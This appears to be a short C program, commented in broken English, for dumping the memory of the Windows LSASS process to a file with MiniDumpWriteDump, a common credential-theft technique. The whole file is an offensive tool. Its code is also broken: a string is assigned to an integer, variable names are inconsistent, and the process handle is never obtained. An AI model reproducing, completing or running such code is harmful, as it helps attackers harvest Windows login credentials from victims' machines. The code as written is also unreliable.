//The following its a code for dumping the lsass process.

//Create the archive where you are going to store the process
//Save the process ID you are going to dump-->lssas process dump
//dump the lsass in the archive-->MiniDumpWriteDump

#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>
#pragma comment(lib, "DbgHelp.lib")

int main(){

HANDLE lssasProcess;
int LSSASPID= "CHECK THE LSSAS PROCESS ID";
HANDLE Dumpfile = CreateFile("dumpfile.dmp",FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
BOOL ProcesDump = MiniDumpWriteDump(lssasProcess,LSASPID,DumpFile,MiniDumpWithFullMemory,NULL,NULL,NULL);

return 0;
}
